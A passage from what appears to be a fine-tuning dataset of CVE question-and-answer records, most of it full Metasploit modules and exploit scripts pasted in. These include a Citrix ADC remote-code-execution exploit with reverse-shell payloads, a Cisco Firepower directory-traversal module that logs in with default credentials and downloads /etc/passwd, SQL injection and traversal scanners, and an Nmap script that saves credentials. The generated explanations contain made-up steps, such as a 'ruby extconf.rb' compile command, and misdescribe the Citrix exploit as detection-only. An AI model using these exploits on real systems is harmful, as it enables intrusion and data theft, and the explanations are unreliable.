CVE-2020-11738.rb: This module is designed for scanning targets to identify systems vulnerable to the described vulnerability. It checks the installed version of the Duplicator plugin and reports back if the system is susceptible to the issue.2. CVE-2020-11738.rc: This module is responsible for exploiting the identified vulnerability. Once a target is determined to be vulnerable, this module attempts to read a specified file using the directory traversal technique mentioned earlier.It's essential to ensure that proper security measures are taken to mitigate the risks associated with this vulnerability. Keeping WordPress installations updated and applying patches promptly is crucial to maintaining a secure environment."}
{"query": "CVE-2015-2562", "Answer": "METASPLOIT: ### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##require 'uri'class MetasploitModule < Msf::Auxiliary  include Msf::Exploit::Remote::HttpClient  include Msf::Auxiliary::Scanner  include Msf::Auxiliary::Report  def initialize(info = {})    super(update_info(info,      'Name'        => 'Web-Dorado ECommerce WD for Joomla! search_category_id SQL Injection Scanner',      'Description' => %q{      This module will scan for hosts vulnerable to an unauthenticated SQL injection within the      advanced search feature of the Web-Dorado ECommerce WD 1.2.5 and likely prior.      },      'Author'       =>        [          'bperry'        ],      'License'     => MSF_LICENSE,      'References'  =>        [          ['CVE', '2015-2562']        ],      'DisclosureDate' => '2015-03-20'))      register_options(        [          OptString.new('TARGETURI', [ true,  \"The path to the Joomla install\", '/'])        ])  end  def run_host(ip)    left_marker = Rex::Text.rand_text_alpha(5)    right_marker = Rex::Text.rand_text_alpha(5)    flag = Rex::Text.rand_text_alpha(5)    res = send_request_cgi({      'uri' => normalize_uri(target_uri.path, 'index.php'),      'method' => 'POST',      'vars_get' => {        'option' => 'com_ecommercewd',        'controller' => 'products',        'task' => 'displayproducts',        'Itemid' => '-1'      },      'vars_post' => {        'product_id' => '-1',        'product_count' => '',        'product_parameters_json' => '',        'search_name' => '',        'search_category_id' => \"1) UNION ALL SELECT CONCAT(0x#{left_marker.unpack(\"H*\")[0]},0x#{flag.unpack(\"H*\")[0]},0x#{right_marker.unpack(\"H*\")[0]})-- \",        'filter_filters_opened' => '0',        'filter_manufacturer_ids' => '1',        'filter_price_from' => '',        'filter_price_to' => '',        'sort_by' => '',        'sort_order' => 'asc',        'pagination_limit_start' => '0',        'pagination_limit' => '12'      }    })    unless res && res.body      vprint_error(\"Server did not respond in an expected way\")      return    end    result = res.body =~ /#{left_marker}#{flag}#{right_marker}/    if result      print_good(\"Vulnerable to CVE-2015-2562 (search_category_id parameter SQL injection)\")      report_vuln({        :host  => rhost,        :port  => rport,        :proto => 'tcp',        :name  => \"Web-Dorado ECommerce WD search_category_id SQL injection\",        :refs  => self.references.select { |ref| ref.ctx_val == \"2015-2562\" }      })    end  endend### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##require 'uri'class MetasploitModule < Msf::Auxiliary  include Msf::Exploit::Remote::HttpClient  include Msf::Auxiliary::Scanner  include Msf::Auxiliary::Report  def initialize(info = {})    super(update_info(info,      'Name'        => 'Web-Dorado ECommerce WD for Joomla! search_category_id SQL Injection Scanner',      'Description' => %q{      This module will scan for hosts vulnerable to an unauthenticated SQL injection within the      advanced search feature of the Web-Dorado ECommerce WD 1.2.5 and likely prior.      },      'Author'       =>        [          'bperry'        ],      'License'     => MSF_LICENSE,      'References'  =>        [          ['CVE', '2015-2562']        ],      'DisclosureDate' => '2015-03-20'))      register_options(        [          OptString.new('TARGETURI', [ true,  \"The path to the Joomla install\", '/'])        ])  end  def run_host(ip)    left_marker = Rex::Text.rand_text_alpha(5)    right_marker = Rex::Text.rand_text_alpha(5)    flag = Rex::Text.rand_text_alpha(5)    res = send_request_cgi({      'uri' => normalize_uri(target_uri.path, 'index.php'),      'method' => 'POST',      'vars_get' => {        'option' => 'com_ecommercewd',        'controller' => 'products',        'task' => 'displayproducts',        'Itemid' => '-1'      },      'vars_post' => {        'product_id' => '-1',        'product_count' => '',        'product_parameters_json' => '',        'search_name' => '',        'search_category_id' => \"1) UNION ALL SELECT CONCAT(0x#{left_marker.unpack(\"H*\")[0]},0x#{flag.unpack(\"H*\")[0]},0x#{right_marker.unpack(\"H*\")[0]})-- \",        'filter_filters_opened' => '0',        'filter_manufacturer_ids' => '1',        'filter_price_from' => '',        'filter_price_to' => '',        'sort_by' => '',        'sort_order' => 'asc',        'pagination_limit_start' => '0',        'pagination_limit' => '12'      }    })    unless res && res.body      vprint_error(\"Server did not respond in an expected way\")      return    end    result = res.body =~ /#{left_marker}#{flag}#{right_marker}/    if result      print_good(\"Vulnerable to CVE-2015-2562 (search_category_id parameter SQL injection)\")      report_vuln({        :host  => rhost,        :port  => rport,        :proto => 'tcp',        :name  => \"Web-Dorado ECommerce WD search_category_id SQL injection\",        :refs  => self.references.select { |ref| ref.ctx_val == \"2015-2562\" }      })    end  endend       Question: CVE-2015-2562[/INST] CVE-2015-2562 is a vulnerability affecting the Web-Dorado ECommerce WD for Joomla! platform. It is an unauthenticated SQL injection vulnerability located in the advanced search feature of the product. An attacker can exploit this vulnerability by sending a specially crafted request to the server, resulting in the exposure of sensitive data or even allowing the attacker to execute arbitrary SQL queries.To identify systems vulnerable to this vulnerability, you can use the provided Metasploit module in Ruby. The code snippet below shows how to create a custom Metasploit module that scans for hosts susceptible to CVE-2015-2562. Make sure you have Metasploit installed before trying to use this code.```rubyrequire 'uri'class MetasploitModule < Msf::Auxiliary  include Msf::Exploit::Remote::HttpClient  include Msf::Auxiliary::Scanner  include Msf::Auxiliary::Report  def initialize(info = {})    super(update_info(info,      'Name'        => 'Web-Dorado ECommerce WD for Joomla! search_category_id SQL Injection Scanner',      'Description' => %q{      This module will scan for hosts vulnerable to an unauthenticated SQL injection within the      advanced search feature of the Web-Dorado ECommerce WD 1.2.5 and likely prior.      },      'Author'       =>        [          'bperry'        ],      'License'     => MSF_LICENSE,      'References'  =>        [          ['CVE', '2015-2562']        ],      'DisclosureDate' => '2015-03-20'))      register_options(        [          OptString.new('TARGETURI', [ true,  \"The path to the Joomla install\", '/'])        ])  end  def run_host(ip)    left_marker = Rex::Text.rand_text_alpha(5)    right_marker = Rex::Text.rand_text_alpha(5)    flag = Rex::Text.rand_text_alpha(5)    res = send_request_cgi({      'uri' => normalize_uri(target_uri.path, 'index.php'),      'method' => 'POST',      'vars_get' => {        'option' => 'com_ecommercewd',        'controller' => 'products',        'task' => 'displayproducts',        'Itemid' => '-1'      },      'vars_post' => {        'product_id' => '-1',        'product_count' => '',        'product_parameters_json' => '',        'search_name' => '',        'search_category_id' => \"1) UNION ALL SELECT CONCAT(0x#{left_marker.unpack(\"H*\")[0]},0x#{flag.unpack(\"H*\")[0]},0x#{right_marker.unpack(\"H*\")[0]})-- \",        'filter_filters_opened' => '0',        'filter_manufacturer_ids' => '1',        'filter_price_from' => '',        'filter_price_to' => '',        'sort_by' => '',        'sort_order' => 'asc',        'pagination_limit_start' => '0',        'pagination_limit' => '12'      }    })    unless res && res.body      vprint_error(\"Server did not respond in an expected way\")      return    end    result = res.body =~ /#{left_marker}#{flag}#{right_marker}/    if result      print_good(\"Vulnerable to CVE-2015-2562 (search_category_id parameter SQL injection)\")      report_vuln({        :host  => rhost,        :port  => rport,        :proto => 'tcp',        :name  => \"Web-Dorado ECommerce WD search_category_id SQL injection\",        :refs  => self.references.select { |ref| ref.ctx_val == \"2015-2562\" }      })    end  endend```Save the above code snippet in a file named `CVE-2015-2562.rb`. After saving the file, navigate to the Metasploit modules folder and run the following command to compile the module:```sh$ ruby extconf.rb -r ./CVE-2015-2562.rb```Now, you should see the newly compiled module available under the `modules/auxiliary/scanner` directory inside the Metasploit framework. Run the module against targets using the following command:```sh$ msfconsole> use auxiliary/scanner/http/joomla_webdorado_sql_injection> set TargetURI /your/joomla/installation/path> run```Replace \"/your/joomla/installation/path\" with the actual path to the Joomla installation you wish to scan. If the target is vulnerable to CVE-2015-2562, the tool will display a message saying \"Vulnerable to CVE-2015-2562\"."}
{"query": "CVE-2019-19781", "Answer": "METASPLOIT: ### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Exploit::Remote  Rank = ExcellentRanking  prepend Msf::Exploit::Remote::AutoCheck  include Msf::Exploit::Remote::HttpClient  include Msf::Exploit::Remote::CheckModule  include Msf::Exploit::FileDropper  include Msf::Module::Deprecated  moved_from 'exploit/linux/http/citrix_dir_traversal_rce'  def initialize(info = {})    super(update_info(info,      'Name' => 'Citrix ADC (NetScaler) Directory Traversal RCE',      'Description'         => %q{        This module exploits a directory traversal in Citrix Application Delivery Controller (ADC), aka        NetScaler, and Gateway 10.5, 11.1, 12.0, 12.1, and 13.0, to execute an arbitrary command payload.      },      'Author'              => [        'Mikhail Klyuchnikov',          # Discovery        'Project Zero India',           # PoC used by this module        'TrustedSec',    # PoC used by this module        'James Brytan',  # PoC contributed independently        'James Smith',   # PoC contributed independently        'Marisa Mack',   # PoC contributed independently        'Rob Vinson',    # PoC contributed independently        'Sergey Pashevkin',             # PoC contributed independently        'Steven Laura',  # PoC contributed independently        'mekhalleh (RAMELLA S\u00e9bastien)' # Module author (https://www.pirates.re/)      ],      'References'          => [        ['CVE', '2019-19781'],        ['EDB', '47901'],        ['EDB', '47902'],        ['URL', 'https://support.citrix.com/article/CTX267027/'],        ['URL', 'https://www.mdsec.co.uk/2020/01/deep-dive-to-citrix-adc-remote-code-execution-cve-2019-19781/'],        ['URL', 'https://swarm.ptsecurity.com/remote-code-execution-in-citrix-adc/']      ],      'DisclosureDate'      => '2019-12-17',      'License'             => MSF_LICENSE,      'Platform'            => ['python', 'unix'],      'Arch' => [ARCH_PYTHON, ARCH_CMD],      'Privileged'          => false,      'Targets'             => [        ['Python',          'Platform'        => 'python',          'Arch'            => ARCH_PYTHON,          'Type'            => :python,          'DefaultOptions'  => {'PAYLOAD' => 'python/meterpreter/reverse_tcp'}        ],        ['Unix Command',          'Platform'        => 'unix',          'Arch'            => ARCH_CMD,          'Type'            => :unix_cmd,          'DefaultOptions'  => {'PAYLOAD' => 'cmd/unix/reverse_perl'}        ]      ],      'DefaultTarget'       => 0,      'DefaultOptions'      => {        'CheckModule'       => 'auxiliary/scanner/http/citrix_dir_traversal',        'HttpClientTimeout' => 3.5      },      'Notes'=> {        'AKA'=> ['Shitrix'],        'Stability'         => [CRASH_SAFE],        'Reliability'       => [REPEATABLE_SESSION],        'SideEffects'       => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]      }    ))    register_options([      OptString.new('TARGETURI', [true, 'Base path', '/'])    ])  end  def cmd_unix_generic?    datastore['PAYLOAD'] == 'cmd/unix/generic'  end  def exploit    print_status(\"Yeeting #{datastore['PAYLOAD']} payload at #{peer}\")    vprint_status(\"Generated payload: #{payload.encoded}\")    case target['Type']    when :python      execute_command(%(/var/python/bin/python2 -c \"#{payload.encoded}\"))    when :unix_cmd      if (res = execute_command(payload.encoded)) && cmd_unix_generic?        print_line(res.get_html_document.text.gsub(/undef error - Attempt to bless.*/m, ''))      end    end  end  def execute_command(cmd, _opts = {})    filename = rand_text_alpha(8..42)    nonce    = rand_text_alpha(8..42)    res = send_request_cgi(      'method'      => 'POST',      'uri'         => normalize_uri(target_uri.path, '/vpn/../vpns/portal/scripts/newbm.pl'),      'headers'     => {        'NSC_USER'  => \"../../../netscaler/portal/templates/#{filename}\",        'NSC_NONCE' => nonce      },      'vars_post'   => {        'url'       => rand_text_alpha(8..42),        'title'     => \"[%template.new({'BLOCK'='print readpipe(#{chr_payload(cmd)})'})%]\"      }    )    unless res && res.code == 200      print_error('No response to POST newbm.pl request')      return    end    res = send_request_cgi(      'method'      => 'GET',      'uri'         => normalize_uri(target_uri.path, \"/vpn/../vpns/portal/#{filename}.xml\"),      'headers'     => {        'NSC_USER'  => rand_text_alpha(8..42),        'NSC_NONCE' => nonce      },      'partial'     => true    )    unless res && res.code == 200      print_warning(\"No response to GET #{filename}.xml request\")    end    register_files_for_cleanup(      \"/netscaler/portal/templates/#{filename}.xml\",      \"/var/tmp/netscaler/portal/templates/#{filename}.xml.ttc2\"    )    res  end  def chr_payload(cmd)    cmd.each_char.map { |c| \"chr(#{c.ord})\" }.join('.')  endend### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Exploit::Remote::HttpClient  include Msf::Auxiliary::Scanner  include Msf::Auxiliary::Report  def initialize(info = {})    super(update_info(info,      'Name'           => 'Citrix ADC (NetScaler) Directory Traversal Scanner',      'Description'    => %{        This module exploits a directory traversal vulnerability (CVE-2019-19781) within Citrix ADC        (NetScaler). It requests the smb.conf file located in the /vpns/cfg directory by issuing the request        /vpn/../vpns/cfg/smb.conf. It then checks if the server is vulnerable by looking for the presence of        a \"[global]\" directive in smb.conf, which this file should always contain.      },      'Author'         => [        'Mikhail Klyuchnikov', # Discovery        'Erik Wynter',         # Module (@wyntererik)        'altonjx'              # Module (@altonjx)      ],      'References'     => [        ['CVE', '2019-19781'],        ['URL', 'https://web.archive.org/web/20200111095223/https://support.citrix.com/article/CTX267027/'],        ['URL', 'https://swarm.ptsecurity.com/remote-code-execution-in-citrix-adc/']      ],      'DisclosureDate' => '2019-12-17',      'License'        => MSF_LICENSE,      'Notes'          => {        'AKA'          => ['Shitrix']      }    ))    register_options([      OptString.new('TARGETURI', [true, 'Base path', '/']),      OptString.new('PATH',      [true, 'Traversal path', '/vpn/../vpns/cfg/smb.conf'])    ])  end  def run_host(target_host)    turi = normalize_uri(target_uri.path, datastore['PATH'])    res = send_request_cgi(      'method' => 'GET',      'uri'    =>  turi    )    unless res      print_error(\"#{full_uri(turi)} - No response, target seems down.\")      return Exploit::CheckCode::Unknown    end    unless res.code == 200      print_error(\"#{full_uri(turi)} - The target is not vulnerable to CVE-2019-19781.\")      vprint_error(\"Obtained HTTP response code #{res.code} for #{full_uri(turi)}.\")      return Exploit::CheckCode::Safe    end    if turi.end_with?('smb.conf')      unless res.headers['Content-Type'].starts_with?('text/plain') && res.body.match(/\\[\\s*global\\s*\\]/)        vprint_warning(\"#{turi} does not contain \\\"[global]\\\" directive.\")      end    end    print_good(\"#{full_uri(turi)} - The target is vulnerable to CVE-2019-19781.\")    msg = \"Obtained HTTP response code #{res.code} for #{full_uri(turi)}. \" \\          \"This means that access to #{turi} was obtained via directory traversal.\"    vprint_good(msg)    report_vuln(      host: target_host,      name: name,      refs: references,      info: msg    )    Exploit::CheckCode::Vulnerable  endendEXPLOIT: # Exploit Title: Citrix Application Delivery Controller (ADC) and Gateway 13.0 - Path Traversal# Date: 2019-12-17# CVE: CVE-2019-19781# Vulenrability: Path Traversal# Vulnerablity Discovery: Mikhail Klyuchnikov# Exploit Author: Dhiraj Mishra# Vulnerable Version: 10.5, 11.1, 12.0, 12.1, and 13.0# Vendor Homepage: https://www.citrix.com/# References: https://support.citrix.com/article/CTX267027# https://github.com/nmap/nmap/pull/1893local http = require \"http\"local stdnse = require \"stdnse\"local shortport = require \"shortport\"local table = require \"table\"local string = require \"string\"local vulns = require \"vulns\"local nmap = require \"nmap\"local io = require \"io\"description = [[This NSE script checks whether the traget server is vulnerable toCVE-2019-19781]]----- @usage-- nmap --script https-citrix-path-traversal -p <port> <host>-- nmap --script https-citrix-path-traversal -p <port> <host> --script-argsoutput='file.txt'-- @output-- PORT   STATE SERVICE-- 443/tcp open  http-- | CVE-2019-19781:-- |   Host is vulnerable to CVE-2019-19781-- @changelog-- 16-01-2020 - Author: Dhiraj Mishra (@RandomDhiraj)-- 17-12-2019 - Discovery: Mikhail Klyuchnikov (@__Mn1__)-- @xmloutput-- <table key=\"NMAP-1\">-- <elem key=\"title\">Citrix ADC Path Traversal aka (Shitrix)</elem>-- <elem key=\"state\">VULNERABLE</elem>-- <table key=\"description\">-- <elem>Citrix Application Delivery Controller (ADC) and Gateway 10.5,11.1, 12.0, 12.1, and 13.0 are vulnerable to a unauthenticated path-- traversal vulnerability that allows attackers to read configurations orany other file.-- </table>-- <table key=\"dates\">-- <table key=\"disclosure\">-- <elem key=\"year\">2019</elem>-- <elem key=\"day\">17</elem>-- <elem key=\"month\">12</elem>-- </table>-- </table>-- <elem key=\"disclosure\">17-12-2019</elem>-- <table key=\"extra_info\">-- </table>-- <table key=\"refs\">-- <elem>https://support.citrix.com/article/CTX267027</elem>-- <elem>https://nvd.nist.gov/vuln/detail/CVE-2019-19781</elem>-- </table>-- </table>author = \"Dhiraj Mishra (@RandomDhiraj)\"Discovery = \"Mikhail Klyuchnikov (@__Mn1__)\"license = \"Same as Nmap--See https://nmap.org/book/man-legal.html\"categories = {\"discovery\", \"intrusive\",\"vuln\"}portrule = shortport.sslaction = function(host,port)  local outputFile = stdnse.get_script_args(SCRIPT_NAME..\".output\") or nil  local vuln = {    title = 'Citrix ADC Path Traversal',    state = vulns.STATE.NOT_VULN,    description = [[Citrix Application Delivery Controller (ADC) and Gateway 10.5, 11.1, 12.0,12.1, and 13.0 are vulnerableto a unauthenticated path traversal vulnerability that allows attackers toread configurations or any other file.    ]],    references = {      'https://support.citrix.com/article/CTX267027',      'https://nvd.nist.gov/vuln/detail/CVE-2019-19781',    },    dates = {      disclosure = {year = '2019', month = '12', day = '17'},    },  }  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)  local path = \"/vpn/../vpns/cfg/smb.conf\"  local response  local output = {}  local success = \"Host is vulnerable to CVE-2019-19781\"  local fail = \"Host is not vulnerable\"  local match = \"[global]\"  local credentials  local citrixADC  response = http.get(host, port.number, path)  if not response.status then    stdnse.print_debug(\"Request Failed\")    return  end  if response.status == 200 then    if string.match(response.body, match) then      stdnse.print_debug(\"%s: %s GET %s - 200 OK\",SCRIPT_NAME,host.targetname or host.ip, path)      vuln.state = vulns.STATE.VULN      citrixADC = ((\"Path traversal: https://%s:%d%s\"):format(host.targetnameor host.ip,port.number, path))      if outputFile then        credentials = response.body:gsub('%W','.')vuln.check_results = stdnse.format_output(true, citrixADC)        vuln.extra_info = stdnse.format_output(true, \"Credentials are beingstored in the output file\")file = io.open(outputFile, \"a\")file:write(credentials, \"\\")      else        vuln.check_results = stdnse.format_output(true, citrixADC)      end    end  elseif response.status == 403 then    stdnse.print_debug(\"%s: %s GET %s - %d\", SCRIPT_NAME, host.targetnameor host.ip, path, response.status)    vuln.state = vulns.STATE.NOT_VULN  end  return vuln_report:make_output(vuln)end       Question: CVE-2019-19781[/INST] CVE-2019-19781 is a vulnerability affecting Citrix Application Delivery Controller (ADC) and Gateway in versions 10.5, 11.1, 12.0, 12.1, and 13.0. This vulnerability is a path traversal issue that allows attackers to read configurations or any other file on the targeted server without authentication.In the context provided, there are two pieces of code snippets \u2013 one written in Ruby for Metasploit framework and the other in Lua for Nmap Scripting Engine (NSE). Both scripts aim to detect and report the vulnerability related to CVE-2019-19781.Let's analyze the Metasploit script first:```rubyclass MetasploitModule < Msf::Exploit::Remote...def run_host(target_host)  ...enddef exploit  ...enddef execute_command(cmd, _opts = {})  ...enddef chr_payload(cmd)  ...endend```This script defines a class `MetasploitModule`, inheriting from `Msf::Exploit::Remote`. Inside this class, methods like `run_host()`, `execute_command()`, `chr_payload()`, and others are defined. These methods help in executing commands on the remote target, sending requests, encoding payloads, etc.When you look closely at the `run_host()` method, you can see that it performs a GET request to the specified URL containing a directory traversal path. Based on the response received, it determines whether the target is vulnerable to CVE-2019-19781 or not.Now let's examine the Nmap script:```luadescription = [[This NSE script checks whether the traget server is vulnerable toCVE-2019-19781]]...action = function(host,port)  ...end```Similar to the Metasploit script, this Nmap script aims to identify servers vulnerable to CVE-2019-19781. Here, the action function takes a host and port as arguments and performs a GET request to the specified URL containing a directory traversal path. Depending on the response received, it sets the vulnerability status accordingly.Overall, both scripts serve the same purpose\u2014detecting and reporting the vulnerability related to CVE-2019-19781. They differ in their usage; while Metasploit is designed for exploitation purposes, Nmap is primarily used for scanning networks and identifying potential vulnerabilities."}
{"query": "CVE-2016-6435", "Answer": "METASPLOIT: ### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Auxiliary::Scanner  include Msf::Auxiliary::Report  include Msf::Exploit::Remote::HttpClient  def initialize(info={})    super(update_info(info,      'Name'           => \"Cisco Firepower Management Console 6.0 Post Auth Report Download Directory Traversal\",      'Description'    => %q{        This module exploits a directory traversal vulnerability in Cisco Firepower Management        under the context of www user. Authentication is required to exploit this vulnerability.      },      'License'        => MSF_LICENSE,      'Author'         =>        [          'Matt',   # Original discovery && PoC          'sinn3r', # Metasploit module        ],      'References'     =>        [          ['CVE', '2016-6435'],          ['URL', 'https://blog.korelogic.com/blog/2016/10/10/virtual_appliance_spelunking']        ],      'DisclosureDate' => '2016-10-10',      'DefaultOptions' =>        {          'RPORT' => 443,          'SSL'   => true,          'SSLVersion' => 'Auto'        }    ))    register_options(      [        # admin:Admin123 is the default credential for 6.0.1        OptString.new('USERNAME', [true, 'Username for Cisco Firepower Management console', 'admin']),        OptString.new('PASSWORD', [true, 'Password for Cisco Firepower Management console', 'Admin123']),        OptString.new('TARGETURI', [true, 'The base path to Cisco Firepower Management console', '/']),        OptString.new('FILEPATH', [false, 'The name of the file to download', '/etc/passwd'])      ])  end  def do_login(ip)    console_user = datastore['USERNAME']    console_pass = datastore['PASSWORD']    uri          = normalize_uri(target_uri.path, 'login.cgi')    print_status(\"Attempting to login in as #{console_user}:#{console_pass}\")    res = send_request_cgi({      'method' => 'POST',      'uri'    => uri,      'vars_post' => {        'username' => console_user,        'password' => console_pass,        'target'   => ''      }    })    unless res      fail_with(Failure::Unknown, 'Connection timed out while trying to log in.')    end    res_cookie = res.get_cookies    if res.code == 302 && res_cookie.include?('CGISESSID')      cgi_sid = res_cookie.scan(/CGISESSID=(\\w+);/).flatten.first      vprint_status(\"CGI Session ID: #{cgi_sid}\")      print_good(\"Authenticated as #{console_user}:#{console_pass}\")      report_cred(ip: ip, user: console_user, password: console_pass)      return cgi_sid    end    nil  end  def report_cred(opts)    service_data = {      address: opts[:ip],      port: rport,      service_name: 'cisco',      protocol: 'tcp',      workspace_id: myworkspace_id    }    credential_data = {      origin_type: :service,      module_fullname: fullname,      username: opts[:user],      private_data: opts[:password],      private_type: :password    }.merge(service_data)    login_data = {      last_attempted_at: DateTime.now,      core: create_credential(credential_data),      status: Metasploit::Model::Login::Status::SUCCESSFUL,      proof: opts[:proof]    }.merge(service_data)    create_credential_login(login_data)  end  def download_file(cgi_sid, file)    file_path = \"../../..#{Rex::FileUtils.normalize_unix_path(file)}\\x00\"    print_status(\"Requesting: #{file_path}\")    send_request_cgi({      'method' => 'GET',      'cookie' => \"CGISESSID=#{cgi_sid}\",      'uri'    => normalize_uri(target_uri.path, 'events/reports/view.cgi'),      'vars_get' => {        'download' => '1',        'files'    => file_path      }    })  end  def remote_file_exists?(res)    (      res.headers['Content-Disposition'] &&      res.headers['Content-Disposition'].match(/attachment; filename=/) &&      res.headers['Content-Type'] &&      res.headers['Content-Type'] == 'application/octet-stream'    )  end  def save_file(res, ip)    fname = res.headers['Content-Disposition'].scan(/filename=(.+)/).flatten.first || File.basename(datastore['FILEPATH'])    path = store_loot(      'cisco.https',      'application/octet-stream',      ip,      res.body,      fname      )    print_good(\"File saved in: #{path}\")  end  def run_host(ip)    cgi_sid = do_login(ip)    unless cgi_sid      fail_with(Failure::Unknown, 'Unable to obtain the cookie session ID')    end    res = download_file(cgi_sid, datastore['FILEPATH'])    if res.nil?      print_error(\"Connection timed out while downloading: #{datastore['FILEPATH']}\")    elsif remote_file_exists?(res)      save_file(res, ip)    else      print_error(\"Remote file not found: #{datastore['FILEPATH']}\")    end  endend### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Auxiliary::Scanner  include Msf::Auxiliary::Report  include Msf::Exploit::Remote::HttpClient  def initialize(info={})    super(update_info(info,      'Name'           => \"Cisco Firepower Management Console 6.0 Post Auth Report Download Directory Traversal\",      'Description'    => %q{        This module exploits a directory traversal vulnerability in Cisco Firepower Management        under the context of www user. Authentication is required to exploit this vulnerability.      },      'License'        => MSF_LICENSE,      'Author'         =>        [          'Matt',   # Original discovery && PoC          'sinn3r', # Metasploit module        ],      'References'     =>        [          ['CVE', '2016-6435'],          ['URL', 'https://blog.korelogic.com/blog/2016/10/10/virtual_appliance_spelunking']        ],      'DisclosureDate' => '2016-10-10',      'DefaultOptions' =>        {          'RPORT' => 443,          'SSL'   => true,          'SSLVersion' => 'Auto'        }    ))    register_options(      [        # admin:Admin123 is the default credential for 6.0.1        OptString.new('USERNAME', [true, 'Username for Cisco Firepower Management console', 'admin']),        OptString.new('PASSWORD', [true, 'Password for Cisco Firepower Management console', 'Admin123']),        OptString.new('TARGETURI', [true, 'The base path to Cisco Firepower Management console', '/']),        OptString.new('FILEPATH', [false, 'The name of the file to download', '/etc/passwd'])      ])  end  def do_login(ip)    console_user = datastore['USERNAME']    console_pass = datastore['PASSWORD']    uri          = normalize_uri(target_uri.path, 'login.cgi')    print_status(\"Attempting to login in as #{console_user}:#{console_pass}\")    res = send_request_cgi({      'method' => 'POST',      'uri'    => uri,      'vars_post' => {        'username' => console_user,        'password' => console_pass,        'target'   => ''      }    })    unless res      fail_with(Failure::Unknown, 'Connection timed out while trying to log in.')    end    res_cookie = res.get_cookies    if res.code == 302 && res_cookie.include?('CGISESSID')      cgi_sid = res_cookie.scan(/CGISESSID=(\\w+);/).flatten.first      vprint_status(\"CGI Session ID: #{cgi_sid}\")      print_good(\"Authenticated as #{console_user}:#{console_pass}\")      report_cred(ip: ip, user: console_user, password: console_pass)      return cgi_sid    end    nil  end  def report_cred(opts)    service_data = {      address: opts[:ip],      port: rport,      service_name: 'cisco',      protocol: 'tcp',      workspace_id: myworkspace_id    }    credential_data = {      origin_type: :service,      module_fullname: fullname,      username: opts[:user],      private_data: opts[:password],      private_type: :password    }.merge(service_data)    login_data = {      last_attempted_at: DateTime.now,      core: create_credential(credential_data),      status: Metasploit::Model::Login::Status::SUCCESSFUL,      proof: opts[:proof]    }.merge(service_data)    create_credential_login(login_data)  end  def download_file(cgi_sid, file)    file_path = \"../../..#{Rex::FileUtils.normalize_unix_path(file)}\\x00\"    print_status(\"Requesting: #{file_path}\")    send_request_cgi({      'method' => 'GET',      'cookie' => \"CGISESSID=#{cgi_sid}\",      'uri'    => normalize_uri(target_uri.path, 'events/reports/view.cgi'),      'vars_get' => {        'download' => '1',        'files'    => file_path      }    })  end  def remote_file_exists?(res)    (      res.headers['Content-Disposition'] &&      res.headers['Content-Disposition'].match(/attachment; filename=/) &&      res.headers['Content-Type'] &&      res.headers['Content-Type'] == 'application/octet-stream'    )  end  def save_file(res, ip)    fname = res.headers['Content-Disposition'].scan(/filename=(.+)/).flatten.first || File.basename(datastore['FILEPATH'])    path = store_loot(      'cisco.https',      'application/octet-stream',      ip,      res.body,      fname      )    print_good(\"File saved in: #{path}\")  end  def run_host(ip)    cgi_sid = do_login(ip)    unless cgi_sid      fail_with(Failure::Unknown, 'Unable to obtain the cookie session ID')    end    res = download_file(cgi_sid, datastore['FILEPATH'])    if res.nil?      print_error(\"Connection timed out while downloading: #{datastore['FILEPATH']}\")    elsif remote_file_exists?(res)      save_file(res, ip)    else      print_error(\"Remote file not found: #{datastore['FILEPATH']}\")    end  endend       Question: CVE-2016-6435[/INST] CVE-2016-6435 is a vulnerability affecting Cisco Firepower Management Console version 6.0. The vulnerability allows an authenticated attacker to download files outside of the intended directory using a directory traversal technique. The exploit involves sending a specially crafted GET request containing a malicious file path to the targeted URL. If successful, the server will respond with the requested file content instead of the expected error message.To demonstrate the exploit, you can use the provided Metasploit module. First, ensure you have Metasploit installed on your system. Then, load the given Metasploit module and configure it with the appropriate options, such as the target IP address, username, password, and the desired file path to download. After setting up the options, execute the module to attempt the exploit. If the exploit is successful, the specified file will be saved locally.Here's a brief explanation of the Metasploit module code snippet:1. The class definition includes necessary modules and sets up basic configuration options.2. The `initialize` method sets up additional options and registers them for usage.3. The `do_login` method attempts to log in to the Cisco Firepower Management Console using the provided credentials. Upon successful login, it returns the CGI session ID.4. The `report_cred` method reports the obtained credentials to the Metasploit framework.5. The `download_file` method sends a GET request to download the specified file using the provided CGI session ID.6. The `remote_file_exists?` method checks if the received response indicates the presence of the requested file.7. The `save_file` method saves the downloaded file to disk.8. The `run_host` method performs the overall exploit flow: logging in, downloading the file, and saving it to disk."}
{"query": "CVE-2014-100002", "Answer": "METASPLOIT: ### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Exploit::Remote::HttpClient  include Msf::Auxiliary::Report  include Msf::Auxiliary::Scanner  def initialize(info={})    super(update_info(info,      'Name'           => \"ManageEngine Support Center Plus Directory Traversal\",      'Description'    => %q{        This module exploits a directory traversal vulnerability found in ManageEngine        Support Center Plus build 7916 and lower. The module will create a support ticket        as a normal user, attaching a link to a file on the server. By requesting our        own attachment, it's possible to retrieve any file on the filesystem with the same        privileges as Support Center Plus is running. On Windows this is always with SYSTEM        privileges.      },      'License'        => MSF_LICENSE,      'Author'         => 'xistence <xistence[at]0x90.nl>', # Discovery, Metasploit module      'References'     =>        [          ['CVE', '2014-100002'],          ['EDB', '31262'],          ['OSVDB', '102656'],          ['BID', '65199'],          ['PACKETSTORM', '124975']        ],      'DisclosureDate' => '2014-01-28'    ))    register_options(      [        Opt::RPORT(8080),        OptString.new('TARGETURI', [true, 'The base path to the Support Center Plus installation', '/']),        OptString.new('USER', [true, 'The Support Center Plus user', 'guest']),        OptString.new('PASS', [true, 'The Support Center Plus password', 'guest']),        OptString.new('FILE', [true, 'The Support Center Plus password', '/etc/passwd'])      ])  end  def run_host(ip)    uri = target_uri.path    peer = 